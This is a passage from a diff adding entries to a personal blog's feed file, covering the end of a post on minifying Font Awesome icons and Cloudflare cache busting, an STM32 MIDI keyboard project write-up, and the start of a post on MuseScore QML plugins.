+&lt;td&gt;Font (cdn; unminified)&lt;/td&gt;
+&lt;td&gt;21&lt;/td&gt;
+&lt;td&gt;63&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Font (site; unminified)&lt;/td&gt;
+&lt;td&gt;38&lt;/td&gt;
+&lt;td&gt;114&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Font (site; minified)&lt;/td&gt;
+&lt;td&gt;47&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn5&quot; id=&quot;fnref5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Font Awesome Free 6 benchmark for downloading assets from a CDN vs Cloudflare site. Here, unminified/minified refers to whether files contain excess icons; it does not refer to excess whitespace. The expectation is that minified assets are faster. (&lt;a href=&quot;https://docs.google.com/spreadsheets/d/1UBUJGIhmdYql2lPz5tYWn6A97iVz1V40YIC2d6iz_vo/view&quot;&gt;Data&lt;/a&gt;)&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;I did leave out one detail though. The minified font is packaged in &lt;em&gt;one&lt;/em&gt; file. The original FA fonts are delivered in &lt;em&gt;three, separate&lt;/em&gt; files (Solid, Regular, Brands). If we account for this by multiplying unminified font results by a factor of 3, I think it&#39;s fair to say we have ourselves a win.&lt;/p&gt;
+&lt;div class=&quot;alert alert-info d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-circle-info ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;Another thing to consider: CDN assets may also be used by other sites, meaning the assets may already be cached. 10 sites using the same CDN font asset is better than 10 sites using minified font assets. If we browse these 10 sites, the former gives 1 set of downloads + 9 cache hits, while the latter has 10 sets of downloads + &lt;em&gt;0&lt;/em&gt; cache hits.&lt;/p&gt;
+&lt;p&gt;Aside from the glaring potential for a delightful, thought-provoking discussion on collectivism and individualism, this begs the question: &lt;em&gt;is it really worth it?&lt;/em&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;cache-busting-with-cloudflare-cache-rules&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#cache-busting-with-cloudflare-cache-rules&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Cache Busting with Cloudflare Cache Rules &lt;i class=&quot;fa-solid fa-gavel&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+&lt;p&gt;Similar to a CDN, we would like to take advantage of browser cache by providing a high cache time. This way, if the user visits the site across the week, they wouldn&#39;t need to re-download the measly 8kB of gzipped assets. This is ideal for sites that update sporadically.&lt;/p&gt;
+&lt;p&gt;You&#39;re probably thinking — come on, it&#39;s just 8kB, are you masochistic? And my response would be: it&#39;s a potential saving of 100ms for return visitors, and yes.&lt;/p&gt;
+&lt;p&gt;By default, Cloudflare Pages has a browser cache time of 4 hours. We can change this duration by modifying the &lt;code&gt;Cache-Control&lt;/code&gt; header.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Creating a cache busting rule in Cloudflare. Cloudflare allows us to configure based on URI patterns.&quot; href=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-2114w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-2114w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 2114 / 784&quot; alt=&quot;Creating a cache busting rule in Cloudflare. Cloudflare allows us to configure based on URI patterns.&quot; title=&quot;Creating a cache busting rule in Cloudflare. Cloudflare allows us to configure based on URI patterns.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-256w.webp 256w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-512w.webp 512w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-1024w.webp 1024w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-create-cache-busting-rule-2114w.webp 2114w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2114px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Create a cache-busting rule for URI paths starting with &lt;code&gt;/cb/&lt;/code&gt;.&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Configure the browser cache duration to 1 year.&quot; href=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-1708w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-1708w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1708 / 554&quot; alt=&quot;Configure the browser cache duration to 1 year.&quot; title=&quot;Configure the browser cache duration to 1 year.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-256w.webp 256w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-512w.webp 512w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-1024w.webp 1024w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cloudflare-set-browser-ttl-1708w.webp 1708w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1708px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Set the cache time to 1 &lt;s&gt;century&lt;/s&gt; year.&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;We got the expected Cache Control header.&quot; href=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-1466w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-1466w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1466 / 934&quot; alt=&quot;We got the expected Cache Control header.&quot; title=&quot;We got the expected Cache Control header.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-256w.webp 256w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-512w.webp 512w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-1024w.webp 1024w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/cache-busting-works-in-browser-1466w.webp 1466w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1466px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;It works!&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;We&#39;ve applied cache-busting to the &lt;code&gt;/cb/&lt;/code&gt; path. All that&#39;s left is to make sure our new assets are written to &lt;code&gt;_site/cb/&lt;/code&gt;; but more importantly, that &lt;strong&gt;the file name changes between different versions&lt;/strong&gt;. This is super important.&lt;/p&gt;
+&lt;p&gt;If we updated our CSS/font file, we need to tell the browser: &amp;quot;Hey! Download and cache the new version online. Don&#39;t use the old cached file!&amp;quot; Changing the file name is the best way to force a cache-miss. Nothing complex. We can just append the file hash to each file.&lt;/p&gt;
+&lt;p&gt;I used the first 8 bytes of MD5, but any common hash will do. Now our files resemble &lt;code&gt;/cb/webfonts/icons-10736075e7883838.woff2&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We just need to propagate this to our CSS, then HTML files, and we&#39;re done!&lt;/p&gt;
+&lt;h2 id=&quot;closing-remarks&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#closing-remarks&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Closing Remarks &lt;i class=&quot;fa-solid fa-glass-water&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+&lt;p&gt;The code is a bit of a handful, but I&#39;ve uploaded it on GitHub: &lt;a href=&quot;https://github.com/TrebledJ/icon-minifier&quot;&gt;TrebledJ/icon-minifier&lt;/a&gt;. Taking inspiration from other projects, I designed it to work as a CLI tool, but you can also import the API. Currently, it only handles Font Awesome fonts. I may add other webfonts later, and maybe have an SVG integration. Pull requests are welcome.&lt;/p&gt;
+&lt;p&gt;I should also point out that icon minification isn&#39;t a new problem. In fact, there are &lt;a href=&quot;https://github.com/aui/font-spider&quot;&gt;some&lt;/a&gt; &lt;a href=&quot;https://github.com/eHanlin/font-generator&quot;&gt;general&lt;/a&gt; &lt;a href=&quot;https://github.com/ecomfe/fontmin&quot;&gt;solutions&lt;/a&gt; designed to minify fonts. These are designed to compress fonts with many characters such as Chinese, Korean, and Japanese; though some work with icons too. Of the three, &lt;a href=&quot;https://github.com/aui/font-spider&quot;&gt;Font Spider&lt;/a&gt; has the most comprehensive features.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn6&quot; id=&quot;fnref6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;Given the mediocre results, I&#39;ll continue keeping an eye on CDN performance and perhaps move on to better alternatives. Next step: mentally prepare myself to wrangle some CSS, and migrate to SVGs.&lt;/p&gt;
+&lt;hr class=&quot;footnotes-sep&quot; /&gt;
+&lt;b&gt;Footnotes&lt;/b&gt;
+&lt;section class=&quot;footnotes&quot;&gt;
+&lt;ol class=&quot;footnotes-list&quot;&gt;
+&lt;li id=&quot;fn1&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;287kB gzipped comes from fa-brands, plus fa-regular, plus fa-solid. Fortunately, these variants are only downloaded if used. 2000 icons just counts solid, regular, and brands. Imagine the number of icons if premium FA was used! &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref1&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn2&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;&lt;a href=&quot;https://fonts.google.com/knowledge/glossary/web_font&quot;&gt;Google Font Glossary: Web Font&lt;/a&gt; &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref2&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn3&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;Total Time includes DNS resolve time + connection time + download time. Times are sourced from &lt;a href=&quot;https://www.uptrends.com/tools/cdn-performance-check&quot;&gt;uptrends.com&lt;/a&gt;. (Not sponsored. It just seems to have the largest coverage.) &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref3&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn4&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;Total Time x3 applies when multiple font files are downloaded. This is used to provide a more accurate representation of resources used. &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref4&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn5&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;The deviation between &amp;quot;Font (site; &lt;em&gt;unminified&lt;/em&gt;)&amp;quot; and &amp;quot;Font (site; &lt;em&gt;minified&lt;/em&gt;)&amp;quot; is most likely due to network latency and jitter. &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref5&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn6&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;It even has a punny Chinese name! 字蛛! &lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fnref6&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+        
+          <category>programming</category>
+        
+          <category>web</category>
+        
+          <category>performance</category>
+        
+          <category>meta</category>
+        
+          <category>notes</category>
+        
+          <category>writeup</category>
+        
+          <category>project</category>
+        
+          <category>software-engineering</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>STM32 MIDI Keyboard</title>
+        <description>Boing boing plunk plunk. Constructing a MIDI keyboard from scratch.</description>
+        <link href="https://trebledj.me/posts/stm32-midi-keyboard/"/>
+        <updated>2022-12-20T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/stm32-midi-keyboard/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;This project was made for a course on embedded systems and is published &lt;a href=&quot;https://github.com/TrebledJ/stm32-midi-keyboard&quot;&gt;online&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;synopsis&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/stm32-midi-keyboard/#synopsis&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Synopsis&lt;/h2&gt;
+&lt;p&gt;The STM32 MIDI Keyboard was a project aimed to practice &lt;a href=&quot;https://trebledj.me/tags/embedded/&quot;&gt;embedded systems&lt;/a&gt; design while also have fun developing a tactile music application. Here are some features found on the keyboard:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2+ octaves (29) piano keys to flexibly play various melodies&lt;/li&gt;
+&lt;li&gt;Supports multi-press, so that we aren&#39;t stuck with boring one-note tunes and can play chords&lt;/li&gt;
+&lt;li&gt;Volume control, so that we don’t disturb our neighbours&lt;/li&gt;
+&lt;li&gt;Metronome, in case the user can’t keep track of tempo&lt;/li&gt;
+&lt;li&gt;TFT display and menu selection&lt;/li&gt;
+&lt;li&gt;Record and playback music (supports multiple channels!)&lt;/li&gt;
+&lt;li&gt;Load/store MIDI in flash memory, in case power runs out&lt;/li&gt;
+&lt;li&gt;Send MIDI signals through Serial USB (UART)
+&lt;ul&gt;
+&lt;li&gt;Receiving is handled by a script (receive.py)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Extra fanciful features:
+&lt;ul&gt;
+&lt;li&gt;Transpose: shift pitches up/down on the diatonic scale&lt;/li&gt;
+&lt;li&gt;Auto-Chord: quality-of-life function to play octaves, triads, and open triads by just pressing the root key&lt;/li&gt;
+&lt;li&gt;Instruments: supports playback of sine, triangle, square, and sawtooth signals&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;development&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/stm32-midi-keyboard/#development&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Development&lt;/h2&gt;
+&lt;p&gt;I was lucky to work with &lt;a href=&quot;https://github.com/TangYanYee&quot;&gt;another member&lt;/a&gt; of the &lt;a href=&quot;https://trebledj.me/posts/hkust-robotics-team&quot;&gt;Robotics Team&lt;/a&gt; at HKUST. She did the electrical work of designing and soldering the &lt;abbr data-bs-placement=&quot;top&quot; data-bs-toggle=&quot;tooltip&quot; title=&quot;The printed circuit board. It&amp;#039;s the underlying hardware that makes everything work!&quot;&gt;PCB&lt;/abbr&gt;. Both of us weren&#39;t familiar with mechanical design, so we ended up sticking things onto plywood and screwing things &lt;s&gt;up&lt;/s&gt; together. But hey, at least it&#39;s a minimum viable product.&lt;/p&gt;
+&lt;p&gt;Although the course provided us with a multi-functional board (STM32F103VET6), we ended up using with a different board (STM32F405). The F4 series comes with more processing power, flash memory, and RAM. These are important considerations when it comes to a real-time music system. Audio buffering needs to be fast and steady, and sufficient memory is required for storage and buffering.&lt;/p&gt;
+&lt;p&gt;We used C++20 for the project.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/stm32-midi-keyboard/#fn1&quot; id=&quot;fnref1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; Although most objects and peripherals were singletons, classes (and templates!) proved useful, especially for containers (such as a &lt;a href=&quot;https://github.com/TrebledJ/stm32-midi-keyboard/blob/main/Core/Inc/utils/tinyvector.hpp&quot;&gt;fixed-size vector&lt;/a&gt;). C++ also allowed us to have static reflection for enums, thanks to &lt;a href=&quot;https://github.com/Neargye/magic_enum&quot;&gt;magic_enum&lt;/a&gt;. The alternative would&#39;ve been X-macros or hard-coding, both less maintainable options.&lt;/p&gt;
+&lt;p&gt;Most MIDI keyboards out there don&#39;t produce sound by themselves, and sometimes I&#39;d rather just noodle around without having to set up any computer software. So one of our goals was to have the keyboard produce sound. This was pretty straightforward. Slap a timer, &lt;abbr data-bs-toggle=&quot;tooltip&quot; title=&quot;Direct Memory Access. Allows data to be transferred without using CPU processing resources. Great for performance!&quot;&gt;DMA&lt;/abbr&gt;, and &lt;abbr data-bs-toggle=&quot;tooltip&quot; title=&quot;Digital-to-audio converter. Converts 1s and 0s to bzzzt-pzzt-mzzt-woink (analog signals).&quot;&gt;DAC&lt;/abbr&gt; together, and &lt;abbr data-bs-toggle=&quot;tooltip&quot; title=&quot;This isn&#39;t an abbreviation. :P&quot;&gt;BAM&lt;/abbr&gt;—non-blocking audio output!&lt;/p&gt;
+&lt;p&gt;We had more trouble with the speakers. They truly annoyed the heck out of us. Earlier on, we used a pair of small woofers. These were connected to an amplifier (because the voltage delivered by the board&#39;s DAC was not enough). The audio output generated when playing one tone (e.g. 440Hz sine) was fine. However for some unknown reason, playing &lt;em&gt;multiple&lt;/em&gt; tones (e.g. 440Hz sine + 660Hz sine) was catastrophic. I asked a question on &lt;a href=&quot;https://dsp.stackexchange.com/questions/85140/adding-two-sine-waves-results-in-a-low-buzz&quot;&gt;dsp.se&lt;/a&gt;, where some users suggested it being a psychoacoustic issue. Thankfully, that was not the case. Eventually we solved the issue by changing to different speakers, the kind used by end-users.&lt;/p&gt;
+&lt;h2 id=&quot;concluding-remarks&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/stm32-midi-keyboard/#concluding-remarks&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Concluding Remarks&lt;/h2&gt;
+&lt;p&gt;It was quite relaxing and nice to have a (semi-?)personal project developing and designing an embedded application from head to tail. The instructors for the course were really helpful as well.&lt;/p&gt;
+&lt;p&gt;If you&#39;re interested in trying something similar, here are some things we planned but didn&#39;t incorporate into our project:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On/off switch&lt;/li&gt;
+&lt;li&gt;Rechargeable battery&lt;/li&gt;
+&lt;li&gt;MIDI-USB output + Real-time MIDI input into software&lt;/li&gt;
+&lt;li&gt;LED backlight under the keyboard?&lt;/li&gt;
+&lt;li&gt;Stereo audio (L/R)&lt;/li&gt;
+&lt;li&gt;Reverb/Chorus settings&lt;/li&gt;
+&lt;li&gt;Note velocity! (Our buttons weren&#39;t responsive enough—even though we used the Yamaha ones.)&lt;/li&gt;
+&lt;li&gt;Better storage (currently we only load/store MIDI for one piece)&lt;/li&gt;
+&lt;li&gt;Explore and use &lt;a href=&quot;https://github.com/FluidSynth/fluidsynth&quot;&gt;FluidSynth&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;More instrument options&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I&#39;ve also published some follow-up tutorials on digital audio synthesis, in case you&#39;re interested in getting your feet wet with audio processing:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://trebledj.me/posts/digital-audio-synthesis-for-dummies-part-1&quot;&gt;Part 1: Digital Signal Processing Basics&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://trebledj.me/posts/digital-audio-synthesis-for-dummies-part-2&quot;&gt;Part 2: Audio Synthesis Basics&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://trebledj.me/posts/digital-audio-synthesis-for-dummies-part-3&quot;&gt;Part 3: Audio Synthesis on Embedded Systems&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr class=&quot;footnotes-sep&quot; /&gt;
+&lt;b&gt;Footnotes&lt;/b&gt;
+&lt;section class=&quot;footnotes&quot;&gt;
+&lt;ol class=&quot;footnotes-list&quot;&gt;
+&lt;li id=&quot;fn1&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;I was excited to try C++20 modules—which gcc-arm v11 supports!—but CMake doesn&#39;t support modules yet. The &lt;a href=&quot;https://gitlab.kitware.com/cmake/cmake/-/issues/18355&quot;&gt;issue&lt;/a&gt; is still ongoing as I write. I think they&#39;re trying, but I guess nobody likes dealing with compilation order? C&#39;mon CMake! It&#39;s been three years already! &lt;a href=&quot;https://trebledj.me/posts/stm32-midi-keyboard/#fnref1&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+        
+          <category>project</category>
+        
+          <category>project</category>
+        
+          <category>embedded</category>
+        
+          <category>cpp</category>
+        
+          <category>c</category>
+        
+          <category>stm32</category>
+        
+          <category>software-engineering</category>
+        
+          <category>dsp</category>
+        
+          <category>music</category>
+        
+          <category>hkust</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>MuseScore Navigation Plugins</title>
+        <description>Developing plugins to enhance the music editors&#39; quality of life.</description>
+        <link href="https://trebledj.me/posts/musescore-navigation-plugins/"/>
+        <updated>2022-09-10T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/musescore-navigation-plugins/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;MuseScore, a music notation desktop application, allows mini-extensions through its QML Plugins. MuseScore is built with the &lt;a href=&quot;https://en.wikipedia.org/wiki/Qt_(software)&quot;&gt;Qt&lt;/a&gt; framework and leverages the QML ecosystem for rapid prototyping and user-developed plugins.&lt;/p&gt;
+&lt;p&gt;QML is a fun language to work with. Generally, the UI is coded in a declarative style and the logic is coded in JavaScript. This, of course, has the downside of losing the static type-checking of C++; so I would often be in the situation where I need to reload and fix things several times before getting it functioning properly.&lt;/p&gt;
+&lt;p&gt;But the freedom and “I don’t care whether your types are correct” attitude of JS were quite nostalgic. Having played with QML/JS before, I decided I wanted to write some MuseScore plugins for fun &lt;s&gt;and also because I felt a need for them&lt;/s&gt;.&lt;/p&gt;
+&lt;p&gt;In this post, I’ll introduce my first set of MuseScore plugins and give a brief developer’s account of them. These plugins aren’t really related to music. Rather, they’re inspired by VSCode plugins and features which I find useful. In a way, the plugins below make MuseScore more of a developer’s second home.&lt;/p&gt;
+&lt;h2 id=&quot;todo-list&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#todo-list&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; todo-list&lt;/h2&gt;
+&lt;div class=&quot;alert alert-info d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-circle-info ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;An update has been published for MuseScore 4.1+. Please refer to the &lt;a href=&quot;https://github.com/TrebledJ/musescore-todo-list/releases/tag/v4.0.0&quot;&gt;new release&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View the project on: &lt;a href=&quot;https://musescore.org/en/project/musescore-do-list&quot;&gt;MuseScore&lt;/a&gt; / &lt;a href=&quot;https://github.com/TrebledJ/musescore-todo-list&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In software development, to-dos are commonly added into source code as reminders to the poor developers toiling away writing code. To-dos come in many forms: bugs to be fixed, issues to be resolved, feature requests, etc.&lt;/p&gt;
+&lt;p&gt;Sometimes when composing, I find myself lost in a sea of to-dos. During a composing session, I might drop a to-do note to follow-up on it next time.&lt;/p&gt;
+&lt;p&gt;Here are some examples of to-dos I might encounter while composing:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;TODO: Explore different chord progressions for this transition.&lt;/li&gt;
+&lt;li&gt;TODO: More brass to this section.&lt;/li&gt;
+&lt;li&gt;FIXME: Playback sounds wonky.&lt;/li&gt;
+&lt;li&gt;TODO: Revise counterpoint.&lt;/li&gt;
+&lt;li&gt;TODO: Add bowing articulation to strings.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Image showing the TODO-list plugin in action.&quot; href=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-2458w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-2458w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 2458 / 1328&quot; alt=&quot;Image showing the TODO-list plugin in action.&quot; title=&quot;Image showing the TODO-list plugin in action.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-256w.webp 256w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-512w.webp 512w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-1024w.webp 1024w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-todo-list-2458w.webp 2458w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2458px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;To allow for different to-do styles and text, I provided several settings for the user to modify. These are listed in on the &lt;a href=&quot;https://github.com/TrebledJ/musescore-todo-list&quot;&gt;GitHub readme&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;developer-s-note&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#developer-s-note&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Developer’s Note&lt;/h3&gt;
+&lt;p&gt;This plugin is inspired by the todo-tree plugin in VSCode, which searches files in the current workspace for &lt;code&gt;TODO&lt;/code&gt;s/&lt;code&gt;FIXME&lt;/code&gt;s and lists them in a tree view. I toyed with idea of replicating this on MuseScore—listing to-dos on all open scores—but eventually decided to embrace the &lt;a href=&quot;https://en.wikipedia.org/wiki/KISS_principle&quot;&gt;KISS principle&lt;/a&gt; and just list to-dos for the current score.&lt;/p&gt;
+&lt;p&gt;When starting, I took reference of &lt;a href=&quot;https://musescore.org/en/project/annotations&quot;&gt;jeetee’s annotation plugin&lt;/a&gt;. I noticed jeetee used Qt Quick Controls 1.0 instead of 2.0 used in some other plugins. Apparently, QML had made some drastic changes to the styling of controls (buttons, checkboxes, etc.). In 1.0, controls used the native style (e.g. Apple’s aqua style for macs). On the other hand, 2.0 controls require developers to customise styling; this may sound great for design flexibility, but in my experience it’s annoying to get it working with both light and dark themes.&lt;/p&gt;
+&lt;div class=&quot;center rw mb-2 h-auto lightbox-gallery&quot;&gt;
+&lt;a class=&quot;&quot; title=&quot;Qt-Quick examples.&quot; href=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick1-880w.webp&quot;&gt;&lt;img class=&quot;multi&quot; src=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick1-880w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;width:49.59%;aspect-ratio: auto 880 / 504&quot; alt=&quot;Qt-Quick examples.&quot; title=&quot;Qt-Quick examples.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick1-256w.webp 256w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick1-512w.webp 512w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick1-880w.webp 880w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 880px&quot; /&gt;&lt;/a&gt;
